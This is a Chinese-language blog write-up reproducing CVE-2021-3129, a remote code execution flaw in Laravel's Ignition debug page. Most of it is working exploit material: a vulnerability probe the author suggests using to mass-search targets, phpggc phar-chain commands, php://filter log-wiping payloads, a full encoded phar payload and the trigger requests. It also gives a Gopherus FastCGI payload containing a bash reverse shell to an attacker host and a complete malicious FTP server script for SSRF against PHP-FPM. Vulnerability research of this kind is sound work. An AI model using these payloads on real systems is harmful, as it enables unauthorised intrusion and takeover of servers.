---
title: "Laravel Debug mode RCE"
date: 2021-06-01T22:24:32+08:00
toc: On
---

## 0x01 前言

Laravel是一套简洁、开源的PHP Web开发框架，旨在实现Web软件的MVC架构。

2021年01月12日，Laravel被披露存在一个远程代码执行漏洞（CVE-2021-3129）。

当Laravel开启了Debug模式时，由于Laravel自带的Ignition  组件对file_get_contents()和file_put_contents()函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发Phar反序列化，最终造成远程代码执行。

已经有很多师傅们复现过这个CVE，本文也只是跟着过一遍，最后简单谈一谈利用ftp被动模式攻击php-fpm的方法。

## 0x02 环境准备

### 利用github上已配置好环境

https://github.com/SNCKER/CVE-2021-3129

### 自己搭建

因为在容器里的话不是很方便我们提示和观测结果，最后我选择了本地直接安装(Windows)

```bash
git clone https://github.com/laravel/laravel.git    
cd laravel
git checkout e849812    # 切换到存在漏洞的分支
composer install        # 安装依赖
composer require facade/ignition==2.5.1    # 下载安装存在漏洞版本的组件
php artisan serve   # 启动服务器
```

搭建完成后，打开配置文件 laravel/config/app.php，找到 ‘debug’项设置为true（开启debug模式）：

之后访问`http://localhost:8000,`会抛出以下运行异常：No application encryption key has been specified.（未指定应用程序的APP_KEY加密密钥）：

![image-20210601233635369](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-01-image-20210601233635369.png)

可以看到这时候 `Ignition`（Laravel 6+默认错误页面生成器）给我们提供了一个solutions，让我们在配置文件中给Laravel配置一个加密APP_KEY。

我们进入laravel根目录，将根目录里的”.env.example”重命名”.env”,然后点击“Generate app key”按钮后会发送一个请求：

可以看到`Ignition` 成功在配置文件.env中生成了一个key，而这也就是我们今天要注意的漏洞关键点。


![image-20210601234219611](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-01-image-20210601234219611.png)

## 0x03 log写入phar触发反序列化

正如上面所说，debug模式中`ignition`附带了“一键修复bug”的功能,本次laravel这个漏洞其实就是发生在上面提到的 `Ignition`（<=2.5.1）中，本次漏洞就是其中的`vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php`中的参数过滤不严谨导致的。

![image-20210602213821629](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-02-image-20210602213821629.png)

可以看到这里主要功能点是：读取一个给定的路径，并替换`$variableName`为`$variableName ?? ''`，之后写回文件中。
 由于这里调用了`file_get_contents()`，且其中的参数可控，所以这里可以通过`phar://`协议去触发phar反序列化。

我们可以发以下数据包检测是否存在漏洞( 可用作fofa批量搜寻漏洞)

```json
POST /_ignition/execute-solution HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: application/json
Connection: close
Content-Length: 166

{
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "theoyu",
    "viewFile": "xxxxxxx"
  }
}
```

![image-20210601235046916](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-02-image-20210601235046916.png)

可以看到有报错，说明漏洞存在，我们现在开始复现。

我们假设后期二次开发人员写了一共文件上传功能，那我们可以传一个恶意`phar`文件，再利用`file_get_contents()`进行反序列化。

这里我们从**phpggc**拿一条链子(好像laravel5的几个链也可以)

```bash
php -d'phar.readonly=0' ./phpggc monolog/rce1 system whoami --phar phar -o phar.phar
```

将其放入laravel下。

利用上述`file_get_contents()`触发。

```json
POST /_ignition/execute-solution HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: application/json
Connection: close
Content-Length: 222

{
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "theoyu",
    "viewFile": "phar:///phpStudy/PHPTutorial/WWW/cms/laravel/phar.phar/test.txt"
  }
}
```

![image-20210602002805556](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-02-image-20210602002805556.png)

可以看到达到了RCE的效果。

本次的重点在于，`/storage/logs/laravel.log`文件具有可写入权限，我们可以利用伪协议清空日志，并构造出`phar`文件格式。

清空payload：

```json
POST /_ignition/execute-solution HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: application/json
Connection: close
Content-Length: 326

{
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "theoyu",
    "viewFile": "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
  }
}
```

关键在于：`convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode`,这里可以看出一共有4步。

- `convert.iconv.utf-8.utf-16be`(UTF-8 -> UTF-16BE)

  ![image-20210602220211795](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-02-image-20210602220211795.png)

- `convert.quoted-printable-encode`(打印所有不可见字符)

- `convert.iconv.utf-16be.utf-8`(UTF-16BE -> UTF-8)

  ![image-20210602220559581](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-02-image-20210602220559581.png)

  可以看到经过这样操作后log文件中所有字符变成了非base64字符，这时候再使用`convert.base64-decode`过滤器就可以成功清空了。

接下来我们需要把payload写入log文件。

我们的确可以直接写入，但我们得确保其他不需要的内容应该删除，同理我们也应该做一些处理：

```bash
 php -d'phar.readonly=0' ./phpggc monolog/rce1 system whoami --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex(ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
```
这里生成的结果是奇数，`convert.quoted-printable-decode`要求是偶数，我们可以往前面或者后面随意添加1个字符，然后写入。
```json
POST /_ignition/execute-solution HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: application/json
Connection: close
Content-Length: 326

{
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "theoyu",
    "viewFile": "=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=72=00=46=00=41=00=67=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=75=00=41=00=67=00=41=00=41=00=54=00=7A=00=6F=00=7A=00=4D=00=6A=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=46=00=4E=00=35=00=63=00=32=00=78=00=76=00=5A=00=31=00=56=00=6B=00=63=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4F=00=54=00=6F=00=69=00=41=00=43=00=6F=00=41=00=63=00=32=00=39=00=6A=00=61=00=32=00=56=00=30=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=49=00=35=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=35=00=76=00=62=00=47=00=39=00=6E=00=58=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=4A=00=63=00=51=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=53=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=36=00=4E=00=7A=00=70=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=37=00=54=00=7A=00=6F=00=79=00=4F=00=54=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=45=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=63=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=41=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=55=00=32=00=6C=00=36=00=5A=00=53=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=6B=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=69=00=49=00=37=00=59=00=54=00=6F=00=78=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=59=00=54=00=6F=00=79=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=63=00=7A=00=6F=00=32=00=4F=00=69=00=4A=00=33=00=61=00=47=00=39=00=68=00=62=00=57=00=6B=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=54=00=6F=00=69=00=62=00=47=00=56=00=32=00=5A=00=57=00=77=00=69=00=4F=00=30=00=34=00=37=00=66=00=58=00=31=00=7A=00=4F=00=6A=00=67=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=78=00=6C=00=64=00=6D=00=56=00=73=00=49=00=6A=00=74=00=4F=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=51=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=6C=00=75=00=61=00=58=00=52=00=70=00=59=00=57=00=78=00=70=00=65=00=6D=00=56=00=6B=00=49=00=6A=00=74=00=69=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=78=00=4E=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=54=00=47=00=6C=00=74=00=61=00=58=00=51=00=69=00=4F=00=32=00=6B=00=36=00=4C=00=54=00=45=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=63=00=48=00=4A=00=76=00=59=00=32=00=56=00=7A=00=63=00=32=00=39=00=79=00=63=00=79=00=49=00=37=00=59=00=54=00=6F=00=79=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=63=00=7A=00=6F=00=33=00=4F=00=69=00=4A=00=6A=00=64=00=58=00=4A=00=79=00=5A=00=57=00=35=00=30=00=49=00=6A=00=74=00=70=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=32=00=4F=00=69=00=4A=00=7A=00=65=00=58=00=4E=00=30=00=5A=00=57=00=30=00=69=00=4F=00=33=00=31=00=39=00=63=00=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=55=00=32=00=6C=00=36=00=5A=00=53=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=6B=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=69=00=49=00=37=00=59=00=54=00=6F=00=78=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=59=00=54=00=6F=00=79=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=63=00=7A=00=6F=00=32=00=4F=00=69=00=4A=00=33=00=61=00=47=00=39=00=68=00=62=00=57=00=6B=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=54=00=6F=00=69=00=62=00=47=00=56=00=32=00=5A=00=57=00=77=00=69=00=4F=00=30=00=34=00=37=00=66=00=58=00=31=00=7A=00=4F=00=6A=00=67=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=78=00=6C=00=64=00=6D=00=56=00=73=00=49=00=6A=00=74=00=4F=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=51=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=6C=00=75=00=61=00=58=00=52=00=70=00=59=00=57=00=78=00=70=00=65=00=6D=00=56=00=6B=00=49=00=6A=00=74=00=69=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=78=00=4E=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=54=00=47=00=6C=00=74=00=61=00=58=00=51=00=69=00=4F=00=32=00=6B=00=36=00=4C=00=54=00=45=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=63=00=48=00=4A=00=76=00=59=00=32=00=56=00=7A=00=63=00=32=00=39=00=79=00=63=00=79=00=49=00=37=00=59=00=54=00=6F=00=79=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=63=00=7A=00=6F=00=33=00=4F=00=69=00=4A=00=6A=00=64=00=58=00=4A=00=79=00=5A=00=57=00=35=00=30=00=49=00=6A=00=74=00=70=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=32=00=4F=00=69=00=4A=00=7A=00=65=00=58=00=4E=00=30=00=5A=00=57=00=30=00=69=00=4F=00=33=00=31=00=39=00=66=00=51=00=55=00=41=00=41=00=41=00=42=00=6B=00=64=00=57=00=31=00=74=00=65=00=51=00=51=00=41=00=41=00=41=00=43=00=49=00=66=00=62=00=64=00=67=00=42=00=41=00=41=00=41=00=41=00=41=00=78=00=2B=00=66=00=39=00=69=00=32=00=41=00=51=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=30=00=5A=00=58=00=4E=00=30=00=4C=00=6E=00=52=00=34=00=64=00=41=00=51=00=41=00=41=00=41=00=43=00=49=00=66=00=62=00=64=00=67=00=42=00=41=00=41=00=41=00=41=00=41=00=78=00=2B=00=66=00=39=00=69=00=32=00=41=00=51=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=52=00=30=00=5A=00=58=00=4E=00=30=00=45=00=31=00=72=00=6D=00=50=00=6C=00=33=00=47=00=64=00=63=00=55=00=68=00=31=00=33=00=63=00=2B=00=58=00=47=00=77=00=6D=00=37=00=50=00=64=00=2B=00=47=00=76=00=59=00=43=00=41=00=41=00=41=00=41=00=52=00=30=00=4A=00=4E=00=51=00=67=00=3D=00=3D=00a"
  }
}
```
把不需要的内容清除：
```json
POST /_ignition/execute-solution HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: application/json
Connection: close
Content-Length: 297

{
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "theoyu",
    "viewFile": "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
  }
}
```
![image-20210602221221071](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/06/2021-06-02-image-20210602221221071.png)

接下来直接打就行。

```json
POST /_ignition/execute-solution HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: application/json
Connection: close
Content-Length: 237

{
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "theoyu",
    "viewFile": "phar:///phpStudy/PHPTutorial/WWW/cms/laravel/storage/logs/laravel.log/test.txt"
  }
}
```

## 0x04 利用FTP SSRF攻击FPM

这其实算是一个比较老的点，但我最近一次接触还是在[蓝帽杯 One Pointer PHP](https://theoyu.top/posts/bluehat/)上，这里的构造基本上相同。

- file_get_contents()连接到我们的FTP服务器，并下载file.txt。
- file_put_contents()连接到我们的FTP服务器，并将其上传回file.txt。

我们使用FTP协议的被动模式让file_get_contents()在我们的服务器上下载一个文件，当它试图使用file_put_contents()把它上传回去时，我们将告诉它把文件发送到127.0.0.1:9000(fpm绑定的本地端口)。

这样，我们就可以向目标主机本地的PHP-FPM发送一个任意的数据包，从而执行代码，造成SSRF。

但github拉取的镜像复现失败了，应该是FPM的问题，不过我们就当有，直接起一个FPM镜像来。

gopherus生成payload

```bash
python gopherus.py --exploit fastcgi
/var/www/public/index.php  # 这里输入的是目标主机上一个已知存在的php文件
bash -c "bash -i >& /dev/tcp/ip/port1 0>&1"  # 这里输入的是要执行的命
```

拿到_后门的部分后写入ftp脚本中：

```python
# -*- coding: utf-8 -*-
# @Time    : 2021/1/13 6:56 下午
# @Author  : tntaxin
# @File    : ftp_redirect.py
# @Software:

import socket
from urllib.parse import unquote

# 对gopherus生成的payload进行一次urldecode
payload = unquote("payload")
payload = payload.encode('utf-8')

host = '0.0.0.0'
port = 23
sk = socket.socket()
sk.bind((host, port))
sk.listen(5)

# ftp被动模式的passvie port,监听到1234
sk2 = socket.socket()
sk2.bind((host, 1234))
sk2.listen()

# 计数器，用于区分是第几次ftp连接
count = 1
while 1:
    conn, address = sk.accept()
    conn.send(b"200 \n")
    print(conn.recv(20))  # USER aaa\r\n  客户端传来用户名
    if count == 1:
        conn.send(b"220 ready\n")
    else:
        conn.send(b"200 ready\n")

    print(conn.recv(20))   # TYPE I\r\n  客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本
    if count == 1:
        conn.send(b"215 \n")
    else:
        conn.send(b"200 \n")

    print(conn.recv(20))  # SIZE /123\r\n  客户端询问文件/123的大小
    if count == 1:
        conn.send(b"213 3 \n")  
    else:
        conn.send(b"300 \n")

    print(conn.recv(20))  # EPSV\r\n'
    conn.send(b"200 \n")

    print(conn.recv(20))   # PASV\r\n  客户端告诉服务端进入被动连接模式
    if count == 1:
        conn.send(b"227 127,0,0,1,4,210\n")  # 服务端告诉客户端需要到哪个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234
    else:
        conn.send(b"227 127,0,0,1,35,40\n")  # 端口计算规则：35*256+40=9000

    print(conn.recv(20))  # 第一次连接会收到命令RETR /123\r\n，第二次连接会收到STOR /123\r\n
    if count == 1:
        conn.send(b"125 \n") # 告诉客户端可以开始数据连接了
        # 新建一个socket给服务端返回我们的payload
        print("建立连接!")
        conn2, address2 = sk2.accept()
        conn2.send(payload)
        conn2.close()
        print("断开连接!")
    else:
        conn.send(b"150 \n")
        print(conn.recv(20))
        exit()

    # 第一次连接是下载文件，需要告诉客户端下载已经结束
    if count == 1:
        conn.send(b"226 \n")
    conn.close()
    count += 1

```

这个脚本做的事情很简单，就是当客户端第一次连接的时候返回我们预设的payload；当客户端第二次连接的时候将客户端的连接重定向到127.0.0.1:9000，也就是目标主机上php-fpm服务的端口，从而造成SSRF，攻击其php-fpm。

最后构造如下请求

```json
POST /_ignition/execute-solution HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: application/json

{
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "username",
    "viewFile": "ftp://aaa@ip:1234/123"
  }
}
```

注意1234是我们服务器起ftp的端口，port1是我们服务器另起一个端口处理反弹过来的shell。

## 0x05 参考

https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g

https://www.anquanke.com/post/id/235228#h2-1

